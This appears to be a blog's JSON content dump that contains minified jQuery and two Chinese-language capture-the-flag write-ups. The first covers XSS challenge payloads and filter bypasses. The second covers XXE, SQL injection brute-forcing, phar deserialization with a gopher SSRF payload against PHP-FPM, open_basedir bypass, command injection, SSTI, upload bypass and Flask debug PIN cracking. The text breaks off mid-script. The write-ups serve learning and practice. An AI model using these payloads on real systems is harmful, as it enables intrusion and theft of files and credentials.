this.pushStack(x.map(this,function(t,n){return e.call(t,n,t)}))},end:function(){return this.prevObject||this.constructor(null)},push:h,sort:[].sort,splice:[].splice},x.fn.init.prototype=x.fn,x.extend=x.fn.extend=function(){var e,n,r,i,o,a,s=arguments[0]||{},l=1,u=arguments.length,c=!1;for(\"boolean\"==typeof s&&(c=s,s=arguments[1]||{},l=2),\"object\"==typeof s||x.isFunction(s)||(s={}),u===l&&(s=this,--l);u>l;l++)if(null!=(o=arguments[l]))for(i in o)e=s[i],r=o[i],s!==r&&(c&&r&&(x.isPlainObject(r)||(n=x.isArray(r)))?(n?(n=!1,a=e&&x.isArray(e)?e:[]):a=e&&x.isPlainObject(e)?e:{},s[i]=x.extend(c,a,r)):r!==t&&(s[i]=r));return s},x.extend({expando:\"jQuery\"+(f+Math.random()).replace(/\\D/g,\"\"),noConflict:function(t){return e.$===x&&(e.$=u),t&&e.jQuery===x&&(e.jQuery=l),x},isReady:!1,readyWait:1,holdReady:function(e){e?x.readyWait++:x.ready(!0)},ready:function(e){if(e===!0?!--x.readyWait:!x.isReady){if(!a.body)return setTimeout(x.ready);x.isReady=!0,e!==!0&&--x.readyWait>0||(n.resolveWith(a,[x]),x.fn.trigger&&x(a).trigger(\"ready\").off(\"ready\"))}},isFunction:function(e){return\"function\"===x.type(e)},isArray:Array.isArray||function(e){return\"array\"===x.type(e)},isWindow:function(e){return null!=e&&e==e.window},isNumeric:function(e){return!isNaN(parseFloat(e))&&isFinite(e)},type:function(e){return null==e?e+\"\":\"object\"==typeof e||\"function\"==typeof e?c[y.call(e)]||\"object\":typeof e},isPlainObject:function(e){var n;if(!e||\"object\"!==x.type(e)||e.nodeType||x.isWindow(e))return!1;try{if(e.constructor&&!v.call(e,\"constructor\")&&!v.call(e.constructor.prototype,\"isPrototypeOf\"))return!1}catch(r){return!1}if(x.support.ownLast)for(n in e)return v.call(e,n);for(n in e);return n===t||v.call(e,n)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},error:function(e){throw Error(e)},parseHTML:function(e,t,n){if(!e||\"string\"!=typeof e)return null;\"boolean\"==typeof t&&(n=t,t=!1),t=t||a;var r=k.exec(e),i=!n&&[];return r?[t.createElement(r[1])]:(r=x.buildFragment([e],t,i),i&&x(i).remove(),x.merge([],r.childNodes))},parseJSON:function(n){return e.JSON&&e.JSON.parse?e.JSON.parse(n):null===n?n:\"string\"==typeof n&&(n=x.trim(n),n&&E.test(n.replace(A,\"@\").replace(j,\"]\").replace(S,\"\")))?Function(\"return \"+n)():(x.error(\"Invalid JSON: \"+n),t)},parseXML:function(n){var r,i;if(!n||\"string\"!=typeof n)return null;try{e.DOMParser?(i=new DOMParser,r=i.parseFromString(n,\"text/xml\")):(r=new ActiveXObject(\"Microsoft.XMLDOM\"),r.async=\"false\",r.loadXML(n))}catch(o){r=t}return r&&r.documentElement&&!r.getElementsByTagName(\"parsererror\").length||x.error(\"Invalid XML: \"+n),r},noop:function(){},globalEval:function(t){t&&x.trim(t)&&(e.execScript||function(t){e.eval.call(e,t)})(t)},camelCase:function(e){return e.replace(D,\"ms-\").replace(L,H)},nodeName:function(e,t){return e.nodeName&&e.nodeName.toLowerCase()===t.toLowerCase()},each:function(e,t,n){var r,i=0,o=e.length,a=M(e);if(n){if(a){for(;o>i;i++)if(r=t.apply(e[i],n),r===!1)break}else for(i in e)if(r=t.apply(e[i],n),r===!1)break}else if(a){for(;o>i;i++)if(r=t.call(e[i],i,e[i]),r===!1)break}else for(i in e)if(r=t.call(e[i],i,e[i]),r===!1)break;return e},trim:b&&!b.call(\"\\ufeff\\u00a0\")?function(e){return null==e?\"\":b.call(e)}:function(e){return null==e?\"\":(e+\"\").replace(C,\"\")},makeArray:function(e,t){var n=t||[];return null!=e&&(M(Object(e))?x.merge(n,\"string\"==typeof e?[e]:e):h.call(n,e)),n},inArray:function(e,t,n){var r;if(t){if(m)return m.call(t,e,n);for(r=t.length,n=n?0>n?Math.max(0,r+n):n:0;r>n;n++)if(n in t&&t[n]===e)return n}return-1},merge:function(e,n){var r=n.length,i=e.length,o=0;if(\"number\"==typeof r)for(;r>o;o++)e[i++]=n[o];else while(n[o]!==t)e[i++]=n[o++];return e.length=i,e},grep:function(e,t,n){var r,i=[],o=0,a=e.length;for(n=!!n;a>o;o++)r=!!t(e[o],o),n!==r&&i.push(e[o]);return i},map:function(e,t,n){var r,i=0,o=e.length,a=M(e),s=[];if(a)for(;o>i;i++)r=t(e[i],i,n),null!=r&&(s[s.length]=r);else for(i in e)r=t(e[i],i,n),null!=r&&(s[s.length]=r);return d.apply([],s)},guid:1,proxy:function(e,n){var r,i,o;return\"string\"==typeof n&&(o=e[n],n=e,e=o),x.isFunction(e)?(r=g.call(arguments,2),i=function(){return e.apply(n||this,r.concat(g.call(arguments)))},i.guid=e.guid=e.guid||x.guid++,i):t},access:function(e,n,r,i,o,a,s){var l=0,u=e.length,c=null==r;if(\"object\"===x.type(r)){o=!0;for(l in r)x.access(e,n,l,r[l],!0,a,s)}else if(i!==t&&(o=!0,x.isFunction(i)||(s=!0),c&&(s?(n.call(e,i),n=null):(c=n,n=function(e,t,n){return c.call(x(e),n)})),n))for(;u>l;l++)n(e[l],r,s?i:i.call(e[l],l,n(e[l],r)));return o?e:c?n.call(e):u?n(e[0],r):a},now:function(){return(new Date).getTime()},swap:function(e,t,n,r){var i,o,a={};for(o in t)a[o]=e.style[o],e.style[o]=t[o];i=n.apply(e,r||[]);for(o in t)e.style[o]=a[o];return i}}),x.ready.promise=function(t){if(!n)if(n=x.Deferred(),\"complete\"===a.readyState)setTimeout(x.ready);else if(a.addEventListener)a.addEventListener(\"DOMContentLoaded\",q,!1),e.addEventListener(\"load\",q,!1);else{a.attachEvent(\"onreadystatechange\",q),e.attachEvent(\"onload\",q);var r=!1;try{r=null==e.frameElement&&a.documentElement}catch(i){}r&&r.doScroll&&function o(){if(!x.isReady){try{r.doScroll(\"left\")}catch(e){return setTimeout(o,50)}_(),x.ready()}}()}return n.promise(t)},x.each(\"Boolean Number String Function Array Date RegExp Object Error\".split(\" \"),function(e,t){c[\"[object \"+t+\"]\"]=t.toLowerCase()});function M(e){var t=e.length,n=x.type(e);return x.isWindow(e)?!1:1===e.nodeType&&t?!0:\"array\"===n||\"function\"!==n&&(0===t||\"number\"==typeof t&&t>0&&t-1 in e)}r=x(a),function(e,t){var n,r,i,o,a,s,l,u,c,p,f,d,h,g,m,y,v,b=\"sizzle\"+-new Date,w=e.document,T=0,C=0,N=st(),k=st(),E=st(),S=!1,A=function(e,t){return e===t?(S=!0,0):0},j=typeof t,D=1"}],"posts":[{"title":"XSS Challenges Walkthrough","slug":"XSS Challenges Walkthrough","date":"2019-11-27T16:00:00.000Z","updated":"2019-12-02T13:33:56.155Z","comments":true,"path":"2019/11/28/XSS Challenges Walkthrough/","link":"","permalink":"https://knlvre.github.io/2019/11/28/XSS Challenges Walkthrough/","excerpt":"","text":"前言平台地址： https://xss-quiz.int21h.jp/ 本平台由日本的一个安全研究员yamagata21搭建 ChallengesStage 1 无任何过滤 查看源代码中表单部分 闭合input标签就行了 &quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; Stage 2 闭合原本的input框 表单有些变化，但是大致上还是一样 payload 如下 &quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; Stage 3 利用其它的input框 输入尝试语句后发现，&lt;、&gt;被过滤了，变为\\&lt;和\\&gt;，也就是被实体编码了，拼接在了一个\\标签当中 &lt;script&gt;alert(document.domain)&lt;/script&gt; 由于&lt;、&gt;被过滤了，所以也就无法去闭合\\标签。但是题目中有另外一个输入的位置（Choose a country处），抓包修改该处，看一下结果 p1=anything&amp;p2=&lt;script&gt;alert(document.domain)&lt;/script&gt; 将Response在浏览器中显示，就可以成功看到弹窗了 Stage 4 利用hidden的input框 抓包发现一共有3个参数，其中p1和p2都被实体编码了 查看源码 但是注意到前面抓包发现，还有第3个参数p3，因为type是hidden的，所以抓包才看见，用这个参数取尝试（注意要闭合其本身的input标签） &quot;&gt;&lt;script&gt;alert(documen.domain)&lt;/script&gt; Stage 5 绕过maxlength的长度限制 提交测试参数：\\&lt;script> 然后查看源码的表单部分，输入有长度限制，但是Burpsuit对这个无压力感，直接绕过，然后闭合标签就可以 &quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; Stage 6 on 事件 bypass 尖括号 题目地址：Stage 6 提交测试参数：\\&lt;script> 然后查看源码的表单部分，发现尖括号被实体编码了 过滤了尖括号，并且没有其他的参数可以使用，用其它事件绕过去，这时候就要考虑用：on 事件 bypass 尖括号 可利用的on事件如下： 利用input的autofocus属性,无需用户交互即可触发xss：autofocus onfocus=&quot;alert(document.domain)&quot; 鼠标向上移动触发js事件,onmouseover要脱离引号，alert在引号内：onmouseover=&quot;alert(document.domain)&quot; 鼠标点击触发js事件：onclick=&quot;alert(document.domain)&quot; 事件会在页面或图像加载完成后立即发生：onload=&quot;alert(document.domain)&quot; on事件完整的格式如上，但是现实过程中要注意闭合前后引号，payload如下 &quot; autofocus onfocus=&quot;alert(document.domain) &quot; onmouseover=&quot;alert(document.domain) &quot; onclick=&quot;alert(document.domain) &quot; onload=&quot;alert(document.domain) 成功反弹 Stage 7 不使用引号 题目地址：Stage 7 提交测试参数：\\&lt;script> 然后查看源码的表单部分，发现尖括号被实体编码了 空格分割属性，然后提交测试参数：1 onclick=”alert(document.domain)” 发现引号也被过滤了 Stage 6是为了闭合前后的引号才用的引号，然而我们可以不用 1 onclick=alert(document.domain) 就可以触发了 Stage 8 javascript伪协议 — javascript:alert(document.domain) 题目地址：Stage 8 提交测试参数：()&lt;&gt;”‘ 发现除了括号，其他都被实体编码了。并且这次被拼接到了\\&lt;a>标签中的herf属性当中 那么本关考察的是：javascript伪协议在a标签的使用 常见用到伪协议的属性如下: src href backgroud payload 如下 javascript:alert(document.domain) 点击生成的连接，就会触发 Stage 9 utf-7编码 题目地址：Stage 9 提交测试参数：()&lt;&gt;”‘ 发现除了括号，其他都被实体编码了。这次位置是在\\&lt;input>标签的中，有双引号需要闭合 网上文章说用utf-7来编码绕过，但是需要特定浏览器环境支持，我试了一下没成功 可以参考文章：utf-7编码的xss payload如下 &quot; onmouseover=alert(document.domain)&gt; 编码后 ↓ +/v8 +ACI- onmouseover=alert(d+AG8AYw-u+AG0-en+AHQALg-d+AG8AbQBh-in)+AD4- Stage 10 双写绕过特定字符串的替换 题目地址：Stage 10 提交测试参数：()&lt;&gt;”‘。源码中发现什么都没有被过滤，位置在\\&lt;input>标签当中 接下来直接尝试反弹语句：“ autofocus onfocus=”alert(document.domain)。查看源码发现字符串domain被替换为空了 第一反应是尝试双写看能不能绕过，payload如下 &quot; autofocus onfocus=&quot;alert(document.domdomainain) 的确成功了 Stage 11 利用属性内HTML编码来绕过 题目地址：Stage 11 提交测试参数：()&lt;&gt;”‘。源码中发现什么都没有被过滤，位置在\\&lt;input>标签当中 接下来直接尝试反弹语句：“ onclick=”alert(document.domain)。查看源码发现字符串onclick被替换为onxxx 尝试其他属性：onfocus、onmouseover、onload、script，结果都和前面一样，被替换掉了。那么本关提示如下： s/script/xscript/ig;” and “s/on[a-z]+=/onxxx=/ig;” and “s/style=/stxxx=/ig; ① script会被替换为xscript；② on事件会被替换为onxxx；③ style会被替换为stxxx 所以这里会不会想到用html编码绕过，去构造\\&lt;script|&gt;标签？但是这是行不通的，因为浏览器在解析xml时，先把标签解析成DOM树，而在标签名解析的时候不会解释html编码。解析成DOM树后，html编码解析只对标签里面属性的值进行解码的，比如说： &lt;a text=&quot;scr&amp;#105;pt&quot;&gt;&lt;/a&gt; 被解析为 ↓ &lt;a text=&quot;script&quot;&gt;&lt;/a&gt; 但是脱离属性外的值不会被解码，例如： &lt;a text=&quot;abc&quot; &quot;scr&amp;#105;pt&quot;&gt;&lt;/a&gt; 被解析为 ↓ &lt;a text=&quot;abc&quot; &quot;scr&amp;#105;pt&quot;&gt;&lt;/a&gt; 所以我们构造的语句必须在属性内，使得编码可以被解析。还是利用javascript伪协议，自己构造一个\\&lt;a>标签，这样算是在href属性内了，payload如下 &quot;&gt;&lt;a href=java&amp;#115;cript:alert(document.domain)&gt;xss&lt;/a&gt; 点击Search之后，会生成一个可点的xss 点击后反弹窗口 其他骚的姿势如下，也可以用来绕过 &quot;&gt;&lt;a href=javascri&amp;#09pt:alert(document.domain)&gt;xss&lt;/a&gt; //&amp;#09 tab制表符html十进制编码 &quot;&gt;&lt;a href=javascri&amp;NewLine;pt&amp;colon;alert(document.domain)&gt;xss&lt;/a&gt; //&amp;NewLine;是html5的换行符,&amp;colon;是冒号 Stage 12 反引号（`）被IE8解释为引号 题目地址：Stage 12 本关的提示如下 “s/[\\x00-\\x20\\&lt;\\&gt;\\“\\‘]//g;” 所以\\x00、空格、尖括号、单双引号都被过滤了。表单构造如下 所以要执行语句必须跳出这个value属性，但是空格被过滤了，就无法使用on事件；尖括号被过滤了，就无法使用\\&lt;script>标签，也无法跳出\\&lt;input>标签；单双引号被过滤了，也无法闭合 然后网上是说使用反引号（`），因为IE8会将反引号解释为引号，闭合value属性，从而利用on事件。这个方法比较局限，没有IE8，所以这里就只给出payload ``onmousemove=alert(document.domain) Stage 13考察style的属性问题，IE浏览器下，跳过跳过 Stage 14考察style的属性问题，IE浏览器下，跳过跳过 Stage 15 document.write()、javascript编码绕过（Unicode和十六进制） 题目地址：Stage 15 测试发现尖括号、单双引号都被过滤了，并且传入的值在value属性当中 本题的输入，会利用document.write()方法输出到value属性当中，那么什么是document.write方法呢？ w3c里是这样定义的：write() 方法可向文档写入 HTML 表达式或 JavaScript 代码。可列出多个参数(exp1,exp2,exp3,…) ，它们将按顺序被追加到文档中。也就是说我们在write一下插入的代码就是js范畴了 所以此时就可以考虑用js的编码来bypass，那么有两种编码方式：分别是Unicode和十六进制，格式如下 ① 首先是Unicode \\u003c =&gt; 左尖括号 \\u003e =&gt; 右尖括号 ② 然后是十六进制 \\x3c =&gt; 左尖括号 \\x3e =&gt; 右尖括号 因为document.write在输出的时候会JavascriptDecode一下数据，会把数据原有\\去除，即php里面的stripslashes。所以我们要用\\\\代替\\，最终payload如下 Unicode： \\\\u003cscript\\\\u003ealert(document.domain);\\\\u003c/script\\\\u003e 十六进制： \\\\x3cscript\\\\x3ealert(document.domain);\\\\x3c/script\\\\x3e Stage 16 document.write()、javascript编码绕过（Unicode和十六进制） 题目地址：Stage 15 测试发现**尖括 Reference https://zhzhdoai.github.io/2019/11/19/用肝刷xss-quiz/ https://www.jianshu.com/p/ed1023d60515 https://www.cnblogs.com/r00tuser/p/7413526.html http://suroot.cn/106.html https://hpdoger.cn/2018/08/02/xss%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%EF%BC%88%E4%BA%8C%EF%BC%89%E4%B9%8B%E6%80%92%E5%88%B7xss-quiz/#challenge3-%E5%85%B6%E5%AE%83input%E6%A1%86%E7%9A%84xss https://www.leavesongs.com/PENETRATION/use-location-xss-bypass.html","categories":[],"tags":[{"name":"XSS Challenges","slug":"XSS-Challenges","permalink":"https://knlvre.github.io/tags/XSS-Challenges/"}],"author":"Knlvre"},{"title":"NJUPT CTF Write Up","slug":"NJUPT CTF Write Up","date":"2019-11-24T16:00:00.000Z","updated":"2019-12-02T13:31:55.743Z","comments":true,"path":"2019/11/25/NJUPT CTF Write Up/","link":"","permalink":"https://knlvre.github.io/2019/11/25/NJUPT CTF Write Up/","excerpt":"","text":"NJUPT CTF大佬同学Somnus把Web给AK了，参考他的WriteUp复现一遍 一共记录 11 道 Web 题目 Fake XML cookbook 抓到的请求当中，看到疑似XXE 根据题目提示 flag in /flag 直接拿到 flag True XML cookbook与上一题同样的界面 尝试，但是相比之前，没有返回了 但是可以读取其他文件，说明这里是 flag 的位置换了 读取源码没看到可以利用的点，只能想到利用xxe进行ssrf打内网，扫描一下储存内网 IP 的几个文件：/etc/hosts，/proc/net/arp，/proc/net/fib_trie。然后在ARP表中发现很多内网 IP 通过http://协议访问192.168.1.8，直接拿到 flag SQLi 并且有弹窗提示 try to make the sqlquery have its own results 测试发现先对POST的值进行URL解码然后进行匹配，过滤了in、-、#、’、or、and、空格 无法使用任何注释符，只能是通过反斜杠（\\）将原本接在 username 的后一个单引号给注释掉，然后 username 的前一个单引号与 password 的前一个单引号闭合。最后的单引号用%00截断掉 password 的第二个单引号（PHP 会判断 %00 为字符串结束符，所以字符串只到这里，最后的单引号会被当做不在字符串内，也就不传入 sql 语句中） username=123\\&amp;passwd=||1;%00 拼接后的字符串就是 $string = &quot;select * from users where username=&#39;123\\&#39; and passwd=&#39;||1;%00&#39;&quot; 传入数据库部分就是 select * from users where username=&#39;123\\&#39; and passwd=&#39;||1; 出现 302 跳转，跟随跳转后提示 hello friend,go back to get the password 那就回来从passwd变量注，但是过滤了许多关键词：substr、mid、select、database。截取字符串的函数只剩下right、left但是逗号却被过滤了，也无法使用。现在就只能使用regexp对每个字符逐一匹配 因为这里过滤了单引号 &amp; 双引号，所以我们自己构造的语句就无法匹配字符串 但是这可以用十六进制代替，因为mysql是接受十六进制的（前面要加0x），并且会将十六进制转ASCII 先尝试0x61（也就是 a） username=123\\&amp;passwd=||username/**/regexp/**/0x61;%00 发现之前的提示：try to make the sqlquery have its own results没了，说明是可以利用的。所以现在结合还可以使用的ascii()函数，写爆破 EXP： Ps：① 因为直接传入%00会被黑名单检测到，所以这里的 python 代码中可以用chr(0)代替；② 因为有一次跑出来的结果是er_know7788990，发现是不完整的，于是手动注第一个字母（除了 e 之外，就是 0x79 了），再开始 import requests,string all_strings = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_&quot; url = &quot;http://nctf2019.x1ct34m.com:40005/index.php&quot; data = { &quot;username&quot;:&quot;123\\\\&quot;, &quot;passwd&quot;:&quot;||passwd/**/regexp/**/0x79;&quot; + chr(0) } while(1): for i in all_strings: response = requests.post(url=url,data=data) if(&quot;try to make the sqlquery have its own results&quot; not in response.text and &quot;hack&quot; not in response.text): print(data) data[&quot;passwd&quot;] = data[&quot;passwd&quot;][0:-2] + hex(ord(i))[-2:] + &quot;;&quot; + chr(0) else: data[&quot;passwd&quot;] = data[&quot;passwd&quot;][0:-4] + hex(ord(i))[-2:] + &quot;;&quot; + chr(0) 转换得到明文 任意用户名，然后用刚才注出来的密码登陆，拿下 flag phar matches everything 上传文件的地方，尝试后提示只能上传jpg、png、gif、jpeg File is not an image.Sorry, only jpg,png,gif,jpeg are allowed.Sorry, your file was not uploaded. 可以通过添加jpg的文件头绕过，但是生成的文件后缀是jpeg，没有本地文件包含漏洞也无法使用 回想题目第一个提示 I hate VIM. 是 VIM 编辑留下的备份文件，可能会留下.swp的备份文件，尝试后发现.catchmime.php.swp，下载源码 通过如下命令恢复swp备份文件 sudo vi -r catchmime.php.swp 看到如下代码 &lt;?php class Easytest{ protected $test; public function funny_get(){ return $this-&gt;test; } } class Main { public $url; public function curl($url){ $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $output=curl_exec($ch); curl_close($ch); return $output; } public function __destruct(){ $this_is_a_easy_test=unserialize($_GET[&#39;careful&#39;]); if($this_is_a_easy_test-&gt;funny_get() === &#39;1&#39;){ echo $this-&gt;curl($this-&gt;url); } } } if(isset($_POST[&quot;submit&quot;])) { $check = getimagesize($_POST[&#39;name&#39;]); if($check !== false) { echo &quot;File is an image - &quot; . $check[&quot;mime&quot;] . &quot;.&quot;; } else { echo &quot;File is not an image.&quot;; } } ?&gt; unserialize()只有一个，但是有2个类需要反序列化，但是有getimagesize()可以利用 phar 反序列化，构造如下 POC Ps：这里要注意，上传的文件名后缀必须是jpeg，而且通过getimagesize函数检测文件类型是否是jpeg，所以在phar文件头部分加入一个jpg文件头部即可 &lt;?php class Easytest{ protected $test; public function __construct(){ $this-&gt;test = &#39;1&#39;; } } class Main { public $url; public function __construct(){ $this-&gt;url = &quot;file:///etc/passwd&quot;; } } $phar_file = &quot;knlvre.phar&quot;; unlink($phar_file); $e = new Easytest(); echo urlencode(serialize($e)).&quot;\\n&quot;; $f=new Main(); //echo serialize($f); $jpg_header = hex2bin(&#39;FFD8FFE000104A46494600010100000100010000FFDB004300080606070605080707070909080A0C140D0C0B0B0C1912130F141D1A1F1E1D1A1C1C20242E2720222C231C1C2837292C30313434341F27393D38323C2E333432FFDB0043010909090C0B0C180D0D1832211C213232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232FFC0&#39;); $phar = new Phar($phar_file); $phar-&gt;startBuffering(); $phar-&gt;setStub($jpg_header.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头用以欺骗检测 $phar-&gt;setMetadata($f); //将自定义meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 $phar-&gt;stopBuffering(); ?&gt; 将生成的phar文件后缀改为jpeg，然后上传 上传序列化字符串，然后phar协议访问上传的文件 修改phar内文件为/etc/hosts，再上传查看，发现只有记录10.0.0.2 在换成ARP表（/proc/net/arp），发现有两个内网IP 将生成phar文件的Metadata部分改为http协议，访问10.0.0.3。发现FPM http://10.0.0.3 接下来思路就是 ssrf+gopher打fpm，参考文章：攻击PHP-FPM 然后将开头的127.0.0.1改为10.0.0.3，端口默认9000不用改，写入phar的payload $this-&gt;url = &quot;gopher://10.0.0.3:9000/_%01%01%E2U%00%08%00%00%00%01%00%00%00%00%00%00%01%04%E2U%01%DB%00%00%0E%02CONTENT_LENGTH18%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%E2U%00%00%00%00%01%05%E2U%00%12%00%00%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%01%05%E2U%00%00%00%00&quot;; 上传然后访问，成功返回 open_basedir是 /var/www/html:/tmp disable_functions如下 pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,putenv,proc_open,passthru,symlink,link,syslog,imap_open,dl,system,mb_send_mail,mail,error_log,unlink,delete,copy,rmdir 用绕过open_basedir的payload Ps：还是要记得127.0.0.1改成10.0.0.3 &lt;?php mkdir(&#39;/tmp/knlvre&#39;);chdir(&#39;/tmp/knlvre/&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(show_source(&#39;/flag&#39;))?&gt; 上传访问，拿下flag easyphp 源码如下 &lt;?php error_reporting(0); highlight_file(__file__); $string_1 = $_GET[&#39;str1&#39;]; $string_2 = $_GET[&#39;str2&#39;]; $cmd = $_GET[&#39;q_w_q&#39;]; //1st if($_GET[&#39;num&#39;] !== &#39;23333&#39; &amp;&amp; preg_match(&#39;/^23333$/&#39;, $_GET[&#39;num&#39;])){ echo &#39;1st ok&#39;.&quot;&lt;br&gt;&quot;; } else{ die(&#39;23333333&#39;); } //2nd if(is_numeric($string_1)){ $md5_1 = md5($string_1); $md5_2 = md5($string_2); if($md5_1 != $md5_2){ $a = strtr($md5_1, &#39;cxhp&#39;, &#39;0123&#39;); $b = strtr($md5_2, &#39;cxhp&#39;, &#39;0123&#39;); if($a == $b){ echo &#39;2nd ok&#39;.&quot;&lt;br&gt;&quot;; } else{ die(&quot;can u give me the right str???&quot;); } } else{ die(&quot;no!!!!!!!!&quot;); } } else{ die(&#39;is str1 numeric??????&#39;); } //3rd $query = $_SERVER[&#39;QUERY_STRING&#39;]; if (strlen($cmd) &gt; 8){ die(&quot;too long :(&quot;); } if( substr_count($query, &#39;_&#39;) === 0 &amp;&amp; substr_count($query, &#39;%5f&#39;) === 0 ){ $arr = explode(&#39; &#39;, $cmd); if($arr[0] !== &#39;ls&#39; || $arr[0] !== &#39;pwd&#39;){ if(substr_count($cmd, &#39;cat&#39;) === 0){ system($cmd); } else{ die(&#39;ban cat :) &#39;); } } else{ die(&#39;bad guy!&#39;); } } else{ die(&#39;nonono _ is bad&#39;); } ?&gt; 三层 WAF，慢慢来 第一层：① %0a 绕过 preg_match() 的匹配 第二层：① 传入str1必须一个数字，通过is_numeric()；② 传入的str1和str2的md5值不能相等，所以不能一开始就传入md5加密后为0e+全数字的，必须经过strtr处理后变成0e+全数字；③ 经过strtr()替换后的md5值必须是0e开头（0的多少次方永远为0），并且0e后面全是数字。 那么str1和str2分别是：md5加密后，strtr()替换后为0e+全数字（就是没替换前是0e+除了c、x、h、p之外全是数字），md5加密后为0e+全数字 str1的爆破代码（2120624） import hashlib,re from multiprocessing import Process def md5(s): return hashlib.md5(s.encode(&quot;utf-8&quot;)).hexdigest() i = 0 while(1): if(md5(str(i))[0:2]==&quot;0e&quot; and re.search(&quot;^[\\dcxhp]*$&quot;,md5(str(i))[2:])): print(&quot;[Success] &quot; + str(i) + &quot; ===&gt; &quot; + md5(str(i))) break else: print(str(i) + &quot; ===&gt; &quot; + md5(str(i))) i += 1 str2的爆破代码（240610708） import hashlib,re from multiprocessing import Process def md5(s): return hashlib.md5(s.encode(&quot;utf-8&quot;)).hexdigest() i = 0 while(1): if(md5(str(i))[0:2]==&quot;0e&quot; and re.search(&quot;^\\d*$&quot;,md5(str(i))[2:])): print(&quot;[Success] &quot; + str(i) + &quot; ===&gt; &quot; + md5(str(i))) break else: print(str(i) + &quot; ===&gt; &quot; + md5(str(i))) i += 1 第三层：①传入的变量q_w_q长度不能超过8；②传入的$_SERVER[‘QUERY_STRING’]（也就是问号后面内容）不能有_或者%5f。因为PHP会将传入的变量中的点（.）转换成为下划线（_），所以可以绕过；③无法使用ls和pwd，我们可以用dir ?num=23333%0a&amp;str1=2120624&amp;str2=240610708&amp;q.w.q=dir%20./ 直接查看flllag.php的话会太长，于是使用通配符 ?num=23333%0a&amp;str1=2120624&amp;str2=240610708&amp;q.w.q=head%20fl* replace hint.php 替换页面很像是preg_replace()函数的功能，直接尝试命令执行 没有disable_functions，测试发现过滤了引号 用chr()函数表示字符，用.拼接 sub=1&amp;pat=1&amp;rep=show_source(chr(47).chr(102).chr(108).chr(97).chr(103)) 或者这样 flask 其他两个界面都正常，但是SHA256界面出现提示 测试其他路径，发现直接回显我们的输入 测试发现存在SSTI 过滤了flag关键字 用字符串拼接绕过 Upload your Shell 根据题目提示，直接来到上传点 对上传类型有限制，更改MIME绕过；对文件中?进行过滤，改为\\&lt;script language=’php’>绕过；对文件后缀有黑名单限制，先改为图片后缀上传试试，返回：filepath:/var/www/html/upload-imgs/8d6b295524ea3a2c2866443112613aa7/Th1s_is_a_fl4g.jpg 后来发现这个/uploaded-imgs目录下是各个用户的文件夹，MD5加密后命名 并且每个文件夹里都只有一个Th1s_is_a_fl4g.jpg，没有其他东西，并且查看图片只会保存 后来发现URL中的action参数存在任意文件包含 尝试包含刚才服务器返回给我们的Th1s_is_a_fl4g.jpg文件，直接拿到 flag flask_website SSRF爆破flask PIN码的漏洞，参考：https://xz.aliyun.com/t/2553 爆破PIN码需要的参数如下： ① username =&gt; 通过/etc/passwd获取 ② flask目录下app.py的绝对路径 =&gt; 通过debug界面（http://addr:port/contact）爆破的路径获取 ③ machine-id =&gt; 通过/etc/mechine-id或者/proc/sys/kernel/random/boot_id获取 ​ （ 当/etc/machine-id为空时该参数为空，如不存在，则为/proc/sys/kernel/random/boot_id中的值 ） ④ mac地址 =&gt; 通过/sys/class/net/eth0/address获取（或者eth0换成ens33） ① username（ctf） ② flask目录下app.py的绝对路径（/usr/local/lib/python3.6/site-packages/flask/app.py） ③ machine-id（一直在变化） 尝试/etc/mechine-id返回该文件不存在，尝试/proc/sys/kernel/random/boot_id返回结果也不对 然后去查看flask的获取pin的源码部分：/usr/local/lib/python3.6/site-packages/werkzeug/debug/init.py 发现读取machine-id的文件其实是/proc/self/cgroup这个文件，访问取最后一个数据 ④ MAC地址（248537822003） 这里获取到的是02:42:ac:16:00:02，但是爆破需要转换成十进制 输入爆破脚本，如下 import hashlib from itertools import chain probably_public_bits = [ &#39;ctf&#39;,# username [+]modify here &#39;flask.app&#39;,# modname &#39;Flask&#39;,# getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)) &#39;/usr/local/lib/python3.6/site-packages/flask/app.py&#39; # getattr(mod, &#39;__file__&#39;, None), [+]modify here ] private_bits = [ &#39;2485378220034&#39;,# str(uuid.getnode()), /sys/class/net/ens33/address [+]modify here &#39;60cc9a7c60bda749da31c81cad6c73ce65cff336a9fc85d722fa6e9ea02d2661&#39;# get_machine_id(), /etc/machine-id 